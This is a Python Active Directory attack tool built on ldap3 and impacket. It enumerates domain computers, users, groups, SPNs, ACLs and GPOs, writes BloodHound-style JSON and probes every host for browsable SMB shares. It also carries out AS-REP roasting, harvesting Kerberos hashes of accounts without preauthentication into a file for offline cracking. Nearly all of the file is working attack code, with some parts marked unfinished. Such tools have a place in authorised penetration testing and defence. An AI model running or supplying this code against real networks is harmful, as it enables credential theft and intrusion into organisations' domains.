#!/usr/bin/python3
from ldap3 import Server, Connection, ALL, ALL_ATTRIBUTES, LEVEL, SUBTREE, ALL_OPERATIONAL_ATTRIBUTES
from progressbar import Bar, Percentage, ProgressBar, ETA
from ldap3.core.exceptions import LDAPKeyError
from impacket.smbconnection import SessionError
from getpass import getpass
from termcolor import colored
from impacket import smbconnection
from impacket.dcerpc.v5 import srvs
from contextlib import suppress
import argparse, textwrap, errno, sys, socket, json, re

# Thanks SecureAuthCorp for GetNPUsers.py
# For Kerberos preauthentication
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from binascii import hexlify
import datetime, random

# Thanks SecureAuthCorp for GetUserSPNs.py
# For SPNUsers enum
from impacket.krb5.ccache import CCache


class EnumAD():

    def __init__(self, domainController, ldaps, output, enumsmb, bhout, kpre, spnEnum, domuser=None, getAll=True, computer=None):
        self.server = domainController
        self.domuser = domuser
        self.ldaps = ldaps
        if not getAll:
            self.computer = computer
        if domuser is not None:
            self.passwd = str(getpass())

        self.ou_structure = domainController.split('.')
        self.dc_string=''
        for element in self.ou_structure:
            self.dc_string += 'dc={},'.format(element)
        
        # LDAP properties
        # At the moment we just want everything
        self.ldapProps = ["*"]


        # Setting lists containing elements we want from the domain controller
        self.computers = []
        self.people = []
        self.groups = []
        self.spn = []
        self.acl = []
        self.gpo = []

        
        self.bind()
        self.search()

        if bhout:
            self.outputToBloodhoundJson()
    
        if enumsmb:
            # Setting variables for further testing and analysis
            self.smbShareCandidates = []
            self.smbBrowseable = {}
            self.sortComputers()
            self.enumSMB()

        if kpre:
            self.enumKerbPre()
    
        if spnEnum:
            self.enumSPNUsers()
        
        self.passwd = None
        self.conn.unbind()

        ## While testing
        #sys.exit(0)

        if output:
            self.output = output
            self.write_file()


    def bind(self): 
        try:
            if self.ldaps:
                self.dc_conn = Server(self.server, port=636, use_ssl=True, get_info='ALL')
                self.conn = Connection(self.dc_conn, user=self.domuser, password=self.passwd)
                self.conn.bind()
                self.conn.start_tls()
            else:
                self.dc_conn = Server(self.server, get_info=ALL)
                self.conn = Connection(self.dc_conn, user=self.domuser, password=self.passwd)
                self.conn.bind()
            if self.ldaps:
                 print('[ ' + colored('OK', 'green') +' ] Bound to LDAPS server: {0}'.format(self.server))           
            else:
                print('[ ' + colored('OK', 'green') +' ] Bound to LDAP server: {0}'.format(self.server))
        # Too broad a catch. 
        # TODO: Catch individual exceptions instead
        except:
            if self.ldaps:
                print('[ ' + colored('NOT OK', 'red') +' ] Failed to bind to LDAPS server: {0}'.format(self.server))
            else:
                print('[ ' + colored('NOT OK', 'red') +' ] Failed to bind to LDAP server: {0}'.format(self.server))
            sys.exit(1)


    def search(self):

        #
        #  For Error Handling:
        #       - LDAPInvalidFilterError
        #  

        # Get computer objects
        self.conn.search(self.dc_string[:-1], '(&(sAMAccountType=805306369)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))', attributes=self.ldapProps, search_scope=SUBTREE)
        #self.conn.search(self.dc_string[:-1], '(objectCategory=computer)', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.computers.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Computer objects')

        # Get person objects
        self.conn.search(self.dc_string[:-1], '(objectCategory=person)', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.people.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Person objects')
        
        # Get group objects
        self.conn.search(self.dc_string[:-1], '(|(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913)(primarygroupid=*))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.groups.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Group objects')

        # Get SPN objects
        self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(serviceprincipalname=*))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.spn.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all SPN objects')

        # Get ACL objects
        self.conn.search(self.dc_string[:-1], '(|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)(samAccountType=268435457)(samAccountType=536870912)(samAccountType=536870913)(objectClass=domain)(&(objectcategory=groupPolicyContainer)(flags=*))(objectcategory=organizationalUnit))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.acl.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all ACL objects')

        # Get GPO objects
        #self.conn.search(self.dc_string[:-1], '(&(|(objectcategory=organizationalUnit)(objectclass=domain))(gplink=*)(flags=*))', attributes=self.ldapProps, search_scope=SUBTREE)
        self.conn.search(self.dc_string[:-1], '(|(&(&(objectcategory=groupPolicyContainer)(flags=*))(name=*)(gpcfilesyspath=*))(objectcategory=organizationalUnit)(objectClass=domain))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.gpo.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all GPO objects')

    
    def splitJsonArr(self, arr):
        if isinstance(arr, list):
            if len(arr) == 1:
                return arr[0]
        return arr

    
    def sidLookup(self, gsid):
        try:
            return self.group_sid_lookup[gsid]
        except KeyError:
            return gsid


    def sidDNLookup(self, dn):
        try:
            return self.group_sid_dn_lookup[dn]
        except KeyError:
            return dn


    def aceLookup(self, memberOf):
        if isinstance(memberOf, str):
            # TODO: RightName is incorrect and needs a lookup
            if "Group" in memberOf:
                return [{ "PrincipalSID": self.sidDNLookup(memberOf), "PrincipalType": "Group", "RightName": "GenericWrite", "AceType": "" }]
            elif "User" in memberOf:
                return [{ "PrincipalSID": self.sidDNLookup(memberOf), "PrincipalType": "User", "RightName": "GenericWrite", "AceType": "" }]
        elif isinstance(memberOf, list):
            retList = []
            for grp in memberOf:
                # TODO: RightName is incorrect and needs a lookup
                if "Group" in grp:
                    retList.append({ "PrincipalSID": self.sidDNLookup(grp), "PrincipalType": "Group", "RightName": "GenericWrite", "AceType": "" })
                elif "User" in grp:
                    retList.append({ "PrincipalSID": self.sidDNLookup(grp), "PrincipalType": "User", "RightName": "GenericWrite", "AceType": "" })
            return retList
        else:
            return [{ "PrincipalName": "", "PrincipalType": "", "RightName": "", "AceType": "" }]
        
        return [{ "PrincipalName": "", "PrincipalType": "", "RightName": "", "AceType": "" }]



    def memberLookup(self, member):
        if isinstance(member, str):
            if "User" in member:
                return [{ "MemberName": member.split(',')[0][-3:], "MemberType": "user" }]
        if isinstance(member, list):
            retList = []
            for mem in member:
                if "User" in mem:
                    retList.append({ "MemberName": mem.split(',')[0][-3:], "MemberType": "user" })
        else:
            return [{ "MemberName": "", "MemberType": "" }]


    def outputToBloodhoundJson(self):
        domName = '@{0}'.format(self.server)
        computers_json = { "computers": [
            ],
            "meta": {
                "type": "computers",
                "count": len(self.computers)
            }
        }
        users_json = { "users": [
            ],
            "meta": {
                "type": "users",
                "count": len(self.people)
            }
        }
        groups_json = { "groups": [
            ],
            "meta": {
                "type": "groups",
                "count": len(self.groups)
            }
        }
        gpos_json = { "gpos": [
            ],
            "meta": {
                "type": "gpos",
                "count": len(self.gpo)
            }
        }
        self.group_sid_lookup = {
        }
        self.group_sid_dn_lookup = {
        }

        idx = 0
        for entry in self.groups:
            group = json.loads(self.groups[idx].entry_to_json())
            self.group_sid_lookup[self.splitJsonArr(group['attributes'].get('objectSid')).split('-')[-1:][0]] = str(self.splitJsonArr(group['attributes'].get('cn'))) + '@{0}'.format(self.server)
            self.group_sid_dn_lookup[self.splitJsonArr(group['attributes'].get('distinguishedName'))] = self.splitJsonArr(group['attributes'].get('objectSid'))
            groups_json["groups"].append({
                "Name": self.splitJsonArr(group['attributes'].get('name')) + domName,
                "Properties": {
                    "highvalue": self.splitJsonArr(group['attributes'].get('isCriticalSystemObject')),
                    "domain": self.server,
                    "objectsid": self.splitJsonArr(group['attributes'].get('objectSid')),
                    "admincount": self.splitJsonArr(group['attributes'].get('adminCount')),
                    "description": self.splitJsonArr(group['attributes'].get('description'))
                },
                "Aces": self.aceLookup(self.splitJsonArr(group['attributes'].get('member'))), 
                "Members": self.memberLookup(self.splitJsonArr(group['attributes'].get('member'))) 
            })
            idx += 1
        print('[ ' + colored('OK', 'green') +' ] Converted all Group objects to Json format')

        idx = 0
        for entry in self.computers:
            computer = json.loads(self.computers[idx].entry_to_json())
            computers_json["computers"].append({
                "Name": self.splitJsonArr(computer['attributes'].get('name')) + '.{0}'.format(self.server),
                "PrimaryGroup": self.sidLookup(str(self.splitJsonArr(computer['attributes'].get('primaryGroupID')))),
                "Properties": {
                    "objectsid": self.splitJsonArr(computer['attributes'].get('objectSid')),
                    "highvalue": self.splitJsonArr(computer['attributes'].get('isCriticalSystemObject')),
                    "domain": self.server,
                    # Set to true since it wouldnt return otherwise due to the ldap filter
                    "enabled": True, 
                    # TODO: Fix
                    "unconstraineddelegation": False,
                    "lastlogon": self.splitJsonArr(computer['attributes'].get('lastLogon')),
                    "pwdlastset": self.splitJsonArr(computer['attributes'].get('pwdLastSet')),
                    "serviceprincipalnames": self.splitJsonArr(computer['attributes'].get('servicePrincipalName')),
                    "operatingsystem": self.splitJsonArr(computer['attributes'].get('operatingSystem')),
                    "description": self.splitJsonArr(computer['attributes'].get('description')),
            },
            # TODO: Fix
            "LocalAdmins": [],
            "RemoteDesktopUsers": [],
            "DcomUsers": [],
            "AllowedToDelegate": self.splitJsonArr(computer['attributes'].get('msds-allowedToDelegateTo'))})
            idx += 1
        print('[ ' + colored('OK', 'green') +' ] Converted all Computer objects to Json format')
        
        idx = 0
        for entry in self.people:
            user = json.loads(self.people[idx].entry_to_json())
            users_json["users"].append({
                "Properties": {
                    "name": self.splitJsonArr(user['attributes'].get('name')) + domName,
                    "domain": self.server,
                    "objectid": self.splitJsonArr(user['attributes'].get('objectSid')),
                    "distinguishedname": self.splitJsonArr(user['attributes'].get('distinguishedName')),
                    "enabled": True,
                    "lastlogon": self.splitJsonArr(user['attributes'].get('lastLogon')),
                    "pwdlastset": self.splitJsonArr(user['attributes'].get('pwdLastSet')),
                    "serviceprincipalnames": self.splitJsonArr(user['attributes'].get('servicePrincipalName')),
                    "hasspn": self.splitJsonArr(user['attributes'].get('servicePrincipalName')),
                    "displayname": self.splitJsonArr(user['attributes'].get('displayName')),
                    "email": self.splitJsonArr(user['attributes'].get('mail')),
                    "title": self.splitJsonArr(user['attributes'].get('title')),
                    "homedirectory": self.splitJsonArr(user['attributes'].get('homeDirectory')),
                    "description": self.splitJsonArr(user['attributes'].get('description')),
                    "userpassword": self.splitJsonArr(user['attributes'].get('userPassword')),
                    "admincount": self.splitJsonArr(user['attributes'].get('adminCount')),
                    "PrimaryGroup": self.sidLookup(str(self.splitJsonArr(user['attributes'].get('primaryGroupID')))), 
                },
                "Aces": self.aceLookup(self.splitJsonArr(user['attributes'].get('memberOf'))),
                "AllowedToDelegate": []
            })
            idx += 1
#        for entry in self.people:
#            user = json.loads(self.people[idx].entry_to_json())
#            users_json["users"].append({
#                "Name": self.splitJsonArr(user['attributes'].get('name')) + domName,
#                "PrimaryGroup": self.sidLookup(str(self.splitJsonArr(user['attributes'].get('primaryGroupID')))), 
#                "Properties": {
#                    "domain": self.server,
#                    "objectsid": self.splitJsonArr(user['attributes'].get('objectSid')),
#                    "enabled": True,
#                    "lastlogon": self.splitJsonArr(user['attributes'].get('lastLogon')),
#                    "pwdlastset": self.splitJsonArr(user['attributes'].get('pwdLastSet')),
#                    "serviceprincipalnames": self.splitJsonArr(user['attributes'].get('servicePrincipalName')),
#                    "hasspn": self.splitJsonArr(user['attributes'].get('servicePrincipalName')),
#                    "displayname": self.splitJsonArr(user['attributes'].get('displayName')),
#                    "email": self.splitJsonArr(user['attributes'].get('mail')),
#                    "title": self.splitJsonArr(user['attributes'].get('title')),
#                    "homedirectory": self.splitJsonArr(user['attributes'].get('homeDirectory')),
#                    "description": self.splitJsonArr(user['attributes'].get('description')),
#                    "userpassword": self.splitJsonArr(user['attributes'].get('userPassword')),
#                    "admincount": self.splitJsonArr(user['attributes'].get('adminCount')),
#                },
#                "Aces": self.aceLookup(self.splitJsonArr(user['attributes'].get('memberOf'))),
#                "AllowedToDelegate": []
#            })
#            idx += 1

        print('[ ' + colored('OK', 'green') +' ] Converted all User objects to Json format')

        idx = 0
        for entry in self.gpo:
            gpo = json.loads(self.gpo[idx].entry_to_json())
            gpos_json["gpos"].append({
                "Name": self.splitJsonArr(gpo['attributes'].get('name')) + domName,
                "Properties": {
                    "highvalue": self.splitJsonArr(gpo['attributes'].get('isCriticalSystemObject')), 
                    "description": self.splitJsonArr(gpo['attributes'].get('description')),
                    "gpcpath": self.splitJsonArr(gpo['attributes'].get('gPCFileSysPath')) 
                },
                "Guid": self.splitJsonArr(gpo['attributes'].get('objectGUID')),
                "Aces": self.aceLookup(self.splitJsonArr(gpo['attributes'].get('')))
            })
            idx += 1
        print('[ ' + colored('OK', 'green') +' ] Converted all GPO objects to Json format')

        with open('{0}-computers.json'.format(self.server), 'w') as f:
            json.dump(computers_json, f, sort_keys=False)
        with open('{0}-users.json'.format(self.server), 'w') as f:
            json.dump(users_json, f, sort_keys=False)
        with open('{0}-groups.json'.format(self.server), 'w') as f:
            json.dump(groups_json, f, sort_keys=False)
        with open('{0}-gpos.json'.format(self.server), 'w') as f:
            json.dump(gpos_json, f, sort_keys=False)

        print('[ ' + colored('OK', 'green') +' ] Wrote all objects to Json format')


    def sortComputers(self):
        for computer in self.computers:
            try:
                self.smbShareCandidates.append(computer['dNSHostName'])
            except LDAPKeyError:
                # No dnsname registered
                continue
        if len(self.smbShareCandidates) == 1:
            print('[ ' + colored('OK', 'green') +' ] Found {0} dnsname'.format(len(self.smbShareCandidates)))
        else:
            print('[ ' + colored('OK', 'green') +' ] Found {0} dnsnames'.format(len(self.smbShareCandidates)))


    def enumSMB(self):
        progBar = ProgressBar(widgets=['SMBConnection test: ',Percentage(), Bar(), ETA()], maxval=len(self.smbShareCandidates)).start()
        prog = 0
        try:
            for dnsname in self.smbShareCandidates:
                try:
                    # Changing default timeout as shares should respond withing 5 seconds if there is a share
                    # and ACLs make it available to self.user with self.passwd
                    # TODO: Need to test if below connection is encrypted or not...
                    smbconn = smbconnection.SMBConnection('\\\\' + str(dnsname), str(dnsname), timeout=5)
                    smbconn.login(self.domuser, self.passwd)
                    dirs = smbconn.listShares()
                    self.smbBrowseable[str(dnsname)] = []
                    for share in dirs:
                        try:
                            path = smbconn.listPath(str(share['shi1_netname']), '*')
                            self.smbBrowseable[str(dnsname)].append(str(path))
                        except (SessionError, UnicodeEncodeError):
                            # Didnt have permission, all good
                            progBar.update(prog + 1)
                            prog += 1
                            continue
                    smbconn.logoff()
                    progBar.update(prog + 1)
                    prog += 1
                except socket.error as sockErr:
                    progBar.update(prog + 1)
                    prog += 1
                    continue
        except ValueError:
            # We reached end of progressbar, continue since we finish below
            pass
        progBar.finish()

        if len(self.smbBrowseable.keys()) == 1:
            print('[ ' + colored('OK', 'green') + ' ] Searched {0} share and {1} are browseable by {2}'.format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), self.domuser))
        else:
            print('[ ' + colored('OK', 'green') + ' ] Searched {0} shares and {1} are browseable by {2}'.format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), self.domuser))
        if len(self.smbBrowseable.keys()) > 0:
            with open('{0}-open-smb'.format(self.server), 'w') as f:
                for key, value in self.smbBrowseable.items():
                    f.write('{0}: {1}'.format(key, value))
        print('[ ' + colored('OK', 'green') + ' ] Wrote browseable shares to {0}-open-smb'.format(self.server))



    def write_file(self):
        with open(str(self.output) + '-computers', 'w') as f:
            for item in self.computers:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-people', 'w') as f:
            for item in self.people:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-groups', 'w') as f:
            for item in self.groups:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-spn', 'w') as f:
            for item in self.spn:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-acl', 'w') as f:
            for item in self.acl:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-gpo', 'w') as f:
            for item in self.gpo:
                f.write(str(item))
                f.write("\n")

        print('[ ' + colored('OK', 'green') +' ] Wrote all files to {0}-obj_name'.format(self.output))


    def enumKerbPre(self):
        # Build user array
        users = []
        self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            users.append(str(entry['cn']) + '@{0}'.format(self.server))
        if len(users) == 0:
            print('[ ' + colored('OK', 'green') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
        else:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
    
        hashes = []
        # Build request for Tickets
        for usr in users:
            clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            asReq = AS_REQ()
            domain = str(self.server).upper()
            serverName = Principal('krbtgt/{0}'.format(domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            pacReq = KERB_PA_PAC_REQUEST()
            pacReq['include-pac'] = True
            encodedPacReq = encoder.encode(pacReq)
            asReq['pvno'] = 5
            asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
            asReq['padata'] = noValue
            asReq['padata'][0] = noValue
            asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
            asReq['padata'][0]['padata-value'] = encodedPacReq

            requestBody = seq_set(asReq, 'req-body')

            options = list()
            options.append(constants.KDCOptions.forwardable.value)
            options.append(constants.KDCOptions.renewable.value)
            options.append(constants.KDCOptions.proxiable.value)
            requestBody['kdc-options'] = constants.encodeFlags(options)

            seq_set(requestBody, 'sname', serverName.components_to_asn1)
            seq_set(requestBody, 'cname', clientName.components_to_asn1)

            requestBody['realm'] = domain

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
            requestBody['till'] = KerberosTime.to_asn1(now)
            requestBody['rtime'] = KerberosTime.to_asn1(now)
            requestBody['nonce'] = random.getrandbits(31)

            supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

            seq_set_iter(requestBody, 'etype', supportedCiphers)

            msg = encoder.encode(asReq)

            try:
                response = sendReceive(msg, domain, self.server)
            except KerberosError as e:
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                    seq_set_iter(requestBody, 'etype', supportedCiphers)
                    msg = encoder.encode(asReq)
                    response = sendReceive(msg, domain, self.server)
                else:
                    continue

            asRep = decoder.decode(response, asn1Spec=AS_REP())[0]

            hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))


        print('[ ' + colored('OK', 'green') +' ] Got {0} hashes'.format(len(hashes)))
        with open('jtr_hashes.out', 'w') as f:
            for h in hashes:
                f.write(str(h) + '\n')

        print('[ ' + colored('OK', 'green') +' ] Wrote all hashes to jtr_hashes.out')



    '''
        Function not finished yet..
    '''
    def enumSPNUsers(self):
        # Build user array
        users_spn = {
        }

        idx = 0
        for entry in self.spn:
            spn = json.loads(self.spn[idx].entry_to_json())
            users_spn[self.splitJsonArr(spn['attributes'].get('name'))] = self.splitJsonArr(spn['attributes'].get('servicePrincipalName')) 
            idx += 1    
        print(users_spn)



if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='getAD-Computers', formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''\
            ___        __  _            ____  _                __                   ______                    
           /   | _____/ /_(_)   _____  / __ \(_)_______  _____/ /_____  _______  __/ ____/___  __  ______ ___ 
          / /| |/ ___/ __/ / | / / _ \/ / / / / ___/ _ \/ ___/ __/ __ \/ ___/ / / / __/ / __ \/ / / / __ `__ \\
         / ___ / /__/ /_/ /| |/ /  __/ /_/ / / /  /  __/ /__/ /_/ /_/ / /  / /_/ / /___/ / / / /_/ / / / / / /
        /_/  |_\___/\__/_/ |___/\___/_____/_/_/   \___/\___/\__/\____/_/   \__, /_____/_/ /_/\__,_/_/ /_/ /_/ 
                                                                          /____/                             

    |*----------------------------------------------------------------------------------------------------------*|

            '''))
    parser.add_argument('dc', type=str, help='Hostname of the Domain Controller')
    parser.add_argument('-o', '--out-file', type=str, help='Path to output file. If no path, CWD is assumed (default: None)')
    parser.add_argument('user', type=str, help='Username of the domain user to query with. The username has to be domain name either by domain\\user or user@domain.org')
    # Not sure if this flag is needed anyway
    #parser.add_argument('-a', '--all', help='Get all Computer Objects from the domain (default: None)', action='store_true')
    parser.add_argument('-c', '--computer', type=str, help='Query specific computer (default: None)')
    parser.add_argument('-s', '--secure', help='Try to estalish connection through LDAPS', action='store_true')
    parser.add_argument('-smb', '--smb', help='Force enumeration of SMB shares onall computer objects fetched', action='store_true')
    parser.add_argument('-kp', '--kerberos_preauth', help='Attempt to gather users that does not require Kerberos preauthentication', action='store_true')
    parser.add_argument('-bh', '--bloodhound', help='Output data in the format expected by BloodHound', action='store_true')
    parser.add_argument('-spn', help='Attempt to get all SPNs and perform Kerberoasting. NB: Does not work yet!', action='store_true')

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    
    # Boolean flow control flags
    file_to_write = None
    if args.out_file:
        file_to_write = args.out_file

    enumAD = EnumAD(args.dc, args.secure, file_to_write, args.smb, args.bloodhound, args.kerberos_preauth, args.spn, args.user)

    # Just print a blank line for output sake
    print('')
